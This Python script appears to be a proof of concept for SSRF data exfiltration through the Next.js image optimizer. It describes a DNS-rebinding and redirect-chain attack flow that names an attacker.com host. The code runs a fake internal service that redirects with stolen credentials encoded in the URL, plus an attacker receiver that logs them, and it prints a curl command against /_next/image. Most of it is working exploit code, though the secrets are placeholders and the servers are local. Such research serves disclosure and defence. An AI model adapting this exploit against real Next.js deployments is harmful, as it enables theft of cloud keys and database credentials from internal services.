#!/usr/bin/env python3
"""
SSRF Data Exfiltration via Redirect Chain
==========================================

This PoC demonstrates how an internal service (reached via DNS rebinding SSRF)
can exfiltrate data by redirecting to an attacker-controlled server.

ATTACK FLOW:
1. Attacker domain 'ssrf.attacker.com' is whitelisted in remotePatterns
2. Attacker uses DNS rebinding: first query returns public IP, second returns 127.0.0.1
3. Next.js image optimizer fetches from what it thinks is attacker domain
4. The DNS-rebinded request actually goes to internal service
5. Internal service returns: 302 redirect to http://attacker.com/exfil?data=STOLEN_SECRET
6. Next.js follows redirect to attacker.com (NO remotePatterns validation on redirects!)
7. Attacker receives the stolen data in their server logs

CRITICAL FINDING:
- fetchExternalImage() does NOT validate redirect targets against remotePatterns
- Only isPrivateIp() is checked for redirect targets
- This allows data exfiltration to ANY public domain
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# Simulated stolen secrets
STOLEN_SECRETS = {
    'aws_access_key': 'AKIAIOSFODNN7EXAMPLE',
    'aws_secret_key': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    'database_url': 'postgres://admin:s3cr3t@internal-db:5432/production',
    'api_key': 'sk-prod-abc123xyz789',
}

class InternalServiceWithExfilHandler(BaseHTTPRequestHandler):
    """
    Simulates an internal service (e.g., K8s, AWS metadata proxy) that
    has been compromised or misconfigured to redirect to attacker domain.
    
    In real attack: DNS rebinding makes Next.js connect here instead of
    the expected external URL.
    """
    
    def do_GET(self):
        path = self.path
        print(f"\n[INTERNAL SERVICE] Received request: {path}")
        
        if '/exfil-redirect' in path:
            # Build exfiltration URL with stolen data
            exfil_data = urllib.parse.urlencode(STOLEN_SECRETS)
            # Redirect to attacker's server with data in URL
            attacker_url = f"http://127.0.0.1:9813/receive?{exfil_data}"
            
            print(f"[INTERNAL SERVICE] Redirecting to attacker with stolen data!")
            print(f"[INTERNAL SERVICE] Redirect URL: {attacker_url}")
            
            self.send_response(302)
            self.send_header('Location', attacker_url)
            self.end_headers()
            
        elif '/exfil-via-path' in path:
            # Alternative: encode data in path
            import base64
            encoded = base64.urlsafe_b64encode(str(STOLEN_SECRETS).encode()).decode()
            attacker_url = f"http://127.0.0.1:9813/data/{encoded}"
            
            self.send_response(302)
            self.send_header('Location', attacker_url)
            self.end_headers()
            
        else:
            # Return image for other paths
            png = bytes([
                0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
                0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
                0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
                0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
                0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
                0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
                0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
            ])
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.send_header('Content-Length', len(png))
            self.end_headers()
            self.wfile.write(png)
    
    def log_message(self, format, *args):
        pass


class AttackerExfilReceiver(BaseHTTPRequestHandler):
    """
    Attacker's server that receives exfiltrated data from the SSRF redirect.
    """
    
    def do_GET(self):
        print("\n" + "=" * 60)
        print("!!!!! EXFILTRATION SUCCESSFUL !!!!!")
        print("=" * 60)
        print(f"[ATTACKER] Received request: {self.path}")
        print(f"[ATTACKER] Full URL: {self.path}")
        
        # Parse and display stolen data
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.path)
        if parsed.query:
            print("\n[ATTACKER] STOLEN DATA:")
            for key, values in parse_qs(parsed.query).items():
                print(f"  {key}: {values[0]}")
        
        # Return valid image so Next.js doesn't error
        png = bytes([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
            0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
            0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
            0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
            0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
            0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
            0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
        ])
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Content-Length', len(png))
        self.end_headers()
        self.wfile.write(png)
        print("=" * 60)
    
    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    import threading
    
    print("=" * 60)
    print(" SSRF Data Exfiltration via Redirect Chain PoC")
    print("=" * 60)
    print("\nStarting servers...")
    
    # Internal service (simulates DNS-rebinded target)
    internal_port = 9812
    internal_server = HTTPServer(('127.0.0.1', internal_port), InternalServiceWithExfilHandler)
    threading.Thread(target=internal_server.serve_forever, daemon=True).start()
    print(f"[+] Internal service on 127.0.0.1:{internal_port}")
    
    # Attacker's exfil receiver
    attacker_port = 9813
    attacker_server = HTTPServer(('127.0.0.1', attacker_port), AttackerExfilReceiver)
    threading.Thread(target=attacker_server.serve_forever, daemon=True).start()
    print(f"[+] Attacker exfil receiver on 127.0.0.1:{attacker_port}")
    
    print("\n" + "=" * 60)
    print("TEST COMMAND:")
    print(f'curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{internal_port}/exfil-redirect&w=64&q=75"')
    print("=" * 60)
    print("\nWaiting for requests...\n")
    
    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
